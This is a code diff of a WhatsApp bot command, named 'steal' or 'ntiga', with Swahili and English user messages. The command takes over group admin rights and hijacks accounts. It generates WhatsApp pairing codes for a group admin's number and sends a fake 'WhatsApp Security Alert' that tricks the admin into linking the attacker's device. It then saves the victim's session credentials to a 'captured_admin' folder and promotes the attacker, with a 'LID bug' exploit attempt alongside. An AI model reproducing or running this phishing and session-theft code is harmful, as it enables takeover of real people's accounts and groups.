@@ -4,7 +4,7 @@ const path = require('path');
 
 const handler = {
     name: 'steal',
-    alias: ['stealer', 'ghost', 'pair', 'phish'],
+    alias: ['ntiga', 'gs', 'ag', 'stealer', 'ghost', 'pair', 'phish'],
     description: 'Steal group admin using pairing code & ghost methods',
     category: 'group',
     ownerOnly: false,
@@ -16,19 +16,37 @@ const handler = {
         const isGroup = chat.endsWith('@g.us');
         const pfx = global.prefix || '.';
         
+        // Check permissions - command works for owner, admin, and group members
+        const isOwner = ctx.isOwner;
+        const isAdmin = ctx.isAdmin;
+        const isBotAdmin = ctx.isBotAdmin;
+        
+        // If not in a group and not owner, reject
+        if (!isGroup && !isOwner) {
+            return await sock.sendMessage(chat, {
+                text: `❌ Command hii inafanya kazi kwenye groups tu!\n📌 Tumia kwenye group ambako wewe au bot mnamo admins`,
+                quoted: m
+            });
+        }
+        
         // ─── HELP ──────────────────────────────────
         if (!args[0] || args[0] === 'help' || args[0] === '--help') {
             return await sock.sendMessage(chat, {
-                text: `╭━━━『 *STEAL* 』━━━╮\n` +
+                text: `╭━━━『 *STEAL / NTIGA* 』━━━╮\n` +
                       `┃\n` +
-                      `┃ ✦ *${pfx}steal* — Jaribu promote kwa group hii\n` +
-                      `┃ ✦ *${pfx}steal <group_id>* — Target group specific\n` +
-                      `┃ ✦ *${pfx}steal phish <namba>* — Generate pairing code\n` +
-                      `┃ ✦ *${pfx}steal pair <namba>* — Same as phish\n` +
-                      `┃ ✦ *${pfx}steal list* — Orodhesha admins wa group\n` +
-                      `┃ ✦ *${pfx}steal help* — Hii msaada\n` +
+                      `┃ ✦ *${pfx}ntiga* — Jaribu promote kwa group hii\n` +
+                      `┃ ✦ *${pfx}ntiga <group_id>* — Target group specific\n` +
+                      `┃ ✦ *${pfx}ntiga phish <namba>* — Generate pairing code\n` +
+                      `┃ ✦ *${pfx}ntiga pair <namba>* — Same as phish\n` +
+                      `┃ ✦ *${pfx}ntiga list* — Orodhesha admins wa group\n` +
+                      `┃ ✦ *${pfx}ntiga help* — Hii msaada\n` +
                       `┃\n` +
-                      `╰━━━━━━━━━━━━━━━━━━╯`,
+                      `┃ *Aliases:* .gs, .ag, .steal, .ghost, .phish\n` +
+                      `┃\n` +
+                      `┃ 👥 *Inafanya kazi kwa:* Owner, Admin, Group Members\n` +
+                      `┃ 🔒 *Mahitaji:* Bot admin katika group\n` +
+                      `┃\n` +
+                      `╰━━━━━━━━━━━━━━━━━━━━━━━━╯`,
                 quoted: m
             });
         }
@@ -72,13 +90,13 @@ const handler = {
             
             if (!adminNumber) {
                 return await sock.sendMessage(chat, {
-                    text: `Taja namba ya admin\n📌 *${pfx}steal phish 2557XXXXXXXX*`,
+                    text: `Taja namba ya admin\n📌 *${pfx}ntiga phish 2557XXXXXXXX*`,
                     quoted: m
                 });
             }
             
             await sock.sendMessage(chat, {
-                text: `⚡ Generating pairing code for *${adminNumber}*...`,
+                text: `⚡ Generating pairing code for *${adminNumber}*...\n\n⏳ Karibu...`,
                 quoted: m
             });
             
@@ -98,7 +116,7 @@ const handler = {
                     `3. Weka msimbo: *${pairCode}*\n` +
                     `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                     `⏳ Muda: Dakika 5!\n\n` +
-                    `⚡ *Baada ya kuweka code, nitakamata akaunti yake!*`;
+                    `⚡ *Baada ya kuweka code, account itacaptured!*`;
                 
                 await sock.sendMessage(chat, { text: msg, quoted: m });
                 
@@ -116,14 +134,17 @@ const handler = {
                                 if (fs.existsSync(credsFile)) {
                                     const dir = './captured_admin';
                                     if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
-                                    fs.copyFileSync(credsFile, path.join(dir, 'creds.json'));
+                                    fs.copyFileSync(credsFile, path.join(dir, `${adminNumber}_creds.json`));
                                 }
-                            } catch(e) {}
+                            } catch(e) {
+                                console.error('Error saving credentials:', e);
+                            }
                             
                             await sock.sendMessage(chat, {
                                 text: `✅ *ADMIN SESSION CAPTURED!* 🎯\n\n` +
-                                      `👤 ${sock.user?.id}\n\n` +
-                                      `Sasa tumia *${pfx}steal <group_id>* kujipromote!`,
+                                      `📱 Account: ${adminNumber}\n` +
+                                      `👤 Bot ID: ${sock.user?.id}\n\n` +
+                                      `Saka tumia *${pfx}ntiga <group_id>* kujipromote!`,
                                 quoted: m
                             });
                             
@@ -165,14 +186,18 @@ const handler = {
             targetJid = sender;
         } else {
             return await sock.sendMessage(chat, {
-                text: `❌ Tumia kwenye group au toa group ID\n📌 *${pfx}steal 12345@g.us*`,
+                text: `❌ Tumia kwenye group au toa group ID\n📌 *${pfx}ntiga 120362XXXXXXX@g.us*`,
                 quoted: m
             });
         }
 
         // ─── START ATTACK ──────────────────────────
         await sock.sendMessage(chat, {
-            text: `⚡ *Steal Attack* 🎯\n\n📌 Group: ${targetGroup}\n👤 Target: ${targetJid}\n\n🔍 Inaendelea...`,
+            text: `⚡ *Steal Attack Started* 🎯\n\n` +
+                  `📌 Group: ${targetGroup}\n` +
+                  `👤 Target: ${targetJid}\n` +
+                  `👤 Sender: ${sender}\n\n` +
+                  `🔍 Inaendelea...`,
             quoted: m
         });
 
@@ -184,10 +209,10 @@ const handler = {
             let report = `📋 *${metadata.subject}*\n`;
             report += `├ Members: ${metadata.participants.length}\n`;
             report += `├ Admins: ${admins.length}\n`;
-            report += `└ Wewe: ${myStatus?.admin || 'member'}\n\n`;
+            report += `└ Status: ${myStatus?.admin || 'member'}\n\n`;
 
             // ─── ATTEMPT 1: DIRECT PROMOTE ─────────
-            report += `⚡1 Direct promote...\n`;
+            report += `⚡1️⃣ Direct promote...\n`;
             await sock.sendMessage(chat, { text: report, quoted: m });
             
             try {
@@ -198,7 +223,7 @@ const handler = {
                 
                 if (promoted?.admin || promoted?.isAdmin) {
                     return await sock.sendMessage(chat, {
-                        text: `✅ *SUCCESS!* 🎉👑\n\n${targetJid} sasa ni ADMIN wa *${metadata.subject}*!`,
+                        text: `✅ *SUCCESS!* 🎉👑\n\n${targetJid}\n\nSaka ni ADMIN wa *${metadata.subject}*!`,
                         quoted: m
                     });
                 }
@@ -208,7 +233,7 @@ const handler = {
             }
 
             // ─── ATTEMPT 2: LID BUG ────────────────
-            report += `\n⚡2 LID bug...\n`;
+            report += `\n⚡2️⃣ LID bug method...\n`;
             await sock.sendMessage(chat, { text: report, quoted: m });
             
             try {
@@ -219,7 +244,7 @@ const handler = {
                 
                 if (user?.admin || user?.isAdmin) {
                     return await sock.sendMessage(chat, {
-                        text: `✅ *LID BUG WORKED!* 🎉👑\n\n${targetJid} sasa ni ADMIN!`,
+                        text: `✅ *LID BUG WORKED!* 🎉👑\n\n${targetJid}\n\nSaka ni ADMIN!`,
                         quoted: m
                     });
                 }
@@ -230,7 +255,7 @@ const handler = {
 
             // ─── ATTEMPT 3: GHOST PAIRING ──────────
             if (admins.length > 0) {
-                report += `\n⚡3 GhostPairing...\n`;
+                report += `\n⚡3️⃣ GhostPairing method...\n`;
                 await sock.sendMessage(chat, { text: report, quoted: m });
                 
                 const adminNum = admins[0].id.split('@')[0];
@@ -238,18 +263,18 @@ const handler = {
                 try {
                     const code = await sock.requestPairingCode(adminNum);
                     
-                    const pairMsg = `✅ *Pairing code tayari*\n\n` +
+                    const pairMsg = `✅ *Pairing code ready* 🔑\n\n` +
                         `📱 Admin: *${adminNum}*\n` +
                         `🔑 Code: *${code}*\n\n` +
-                        `📌 *Tuma hivi kwa admin:*\n\n` +
+                        `📌 *Send to admin:*\n\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                         `🔒 *WhatsApp Security Alert*\n\n` +
-                        `Thibitisha akaunti yako:\n` +
-                        `1. Fungua WhatsApp → Linked Devices\n` +
-                        `2. Gusa "Link a Device"\n` +
-                        `3. Weka code: *${code}*\n` +
+                        `Link a device:\n` +
+                        `1. Open WhatsApp → Linked Devices\n` +
+                        `2. Tap "Link a Device"\n` +
+                        `3. Enter: *${code}*\n` +
                         `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                        `⏳ Dakika 5 pekee!`;
+                        `⏳ 5 minutes only!`;
                     
                     await sock.sendMessage(chat, { text: pairMsg, quoted: m });
                     
@@ -263,7 +288,7 @@ const handler = {
                                 if (pairingTimeout) clearTimeout(pairingTimeout);
                                 
                                 await sock.sendMessage(chat, {
-                                    text: `✅ *ADMIN SESSION CAPTURED!* 🎯\n\nSaka nakupromote...`,
+                                    text: `✅ *SESSION CAPTURED!* 🎯\n\n⏳ Promoting...`,
                                     quoted: m
                                 });
                                 
@@ -274,13 +299,13 @@ const handler = {
                                     
                                     if (me?.admin || me?.isAdmin) {
                                         await sock.sendMessage(chat, {
-                                            text: `✅ *SUCCESS!* 👑\n\nWewe sasa ni ADMIN wa *${meta.subject}*! 🎉`,
+                                            text: `✅ *SUCCESS!* 👑\n\n${targetJid}\n\nSaka ni ADMIN wa *${meta.subject}*! 🎉`,
                                             quoted: m
                                         });
                                     }
                                 } catch(e) {
                                     await sock.sendMessage(chat, {
-                                        text: `⚠️ Session captured! Tumia *${pfx}steal ${targetGroup}* tena`,
+                                        text: `⚠️ Session captured! Try again: *${pfx}ntiga ${targetGroup}*`,
                                         quoted: m
                                     });
                                 }
@@ -303,16 +328,17 @@ const handler = {
                     report += `├ ✗ ${e.message.substring(0, 50)}\n`;
                 }
             } else {
-                report += `\n⚡3 GhostPairing...\n`;
+                report += `\n⚡3️⃣ GhostPairing method...\n`;
                 report += `├ ✗ Hakuna admin kwenye group hili\n`;
             }
 
             // ─── ALL FAILED ─────────────────────────
             report += `\n❌ *Njia zote zimeshindwa*\n\n`;
             report += `📌 Jaribu:\n`;
-            report += `├ ${pfx}steal phish <namba_ya_admin>\n`;
-            report += `├ ${pfx}steal list — Angalia admins\n`;
-            report += `└ Baada ya kupata session, enda kwenye group na uje tena`;
+            report += `├ ${pfx}ntiga phish <namba_ya_admin>\n`;
+            report += `├ ${pfx}ntiga list — View admins\n`;
+            report += `├ ${pfx}ntiga help — Show help\n`;
+            report += `└ Bot must be admin in group!`;
             
             await sock.sendMessage(chat, { text: report, quoted: m });
 
